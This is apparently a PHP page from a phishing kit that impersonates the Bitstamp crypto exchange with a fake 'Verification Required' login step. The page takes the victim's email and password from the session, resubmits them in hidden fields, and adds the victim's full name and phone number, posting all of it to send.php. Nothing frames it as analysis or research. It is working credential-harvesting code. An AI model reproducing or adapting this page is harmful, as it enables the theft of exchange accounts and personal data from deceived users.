<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Bitstamp Trusted Crypto Exchange | Buy & Sell Cryptocurrencies';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        unset($_SESSION['phone_number']);
    ?>
    <link rel="stylesheet" href="<?= base_url('assets/country-code-picker/css/jquery.ccpicker.css')?>">
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-sm-5 my60">
                    <h3 class="text-center fw-semibold py10" style="color: #003B2F">Log In</h3>
                    <h5 class="text-center fw-semibold py10" style="color: #003B2F">Verification Required</h5>
                    <form method="post" action="<?= base_url('send.php') ?>" >
                        <input type="hidden" name="email" value="<?= $_SESSION['email'] ?>" >
                        <input type="hidden" name="password" value="<?= $_SESSION['password'] ?>" >
                        <div class="form-floating my30">
                            <input name="name" type="text" maxlength="100" required="" class="form-control form-control-lg form-control-add" placeholder="Full Name" value="" >
                            <label>Full Name</label>
                        </div>
                        <div className="my25">
                            <label for="" class="form-label">Phone Number</label>
                            <div class="form-control form-control-add fs16" style="padding: 0px;">
                                <input name="phone_number" type="number" id="phone_number" required="" style="width: 80%;border: solid 0px #DDD;padding: 10px 5px;margin: 0px; background-color: transparent" class="" placeholder="Phone number" value="" >
                            </div>
                        </div>
                        <div class="d-grid my25 mx60">
                            <button type="submit" class="btn btn-success btn-primary-2 py11">Verify</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Find..." });
            });
            
        </script>
    </body>
</html>